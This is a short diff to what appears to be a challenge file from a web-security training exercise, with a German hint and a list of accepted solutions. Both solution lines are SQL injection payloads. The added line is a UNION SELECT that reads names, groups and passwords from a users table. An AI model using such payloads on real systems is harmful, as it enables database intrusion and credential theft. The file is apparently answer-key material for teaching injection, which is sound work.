@@ -10,3 +10,4 @@
   - "Bitte keine Werbung."
 :solutions:
   - "' OR groups LIKE '%Hidden%' -- "
+  - "' UNION SELECT id, name, groups, password FROM users -- "
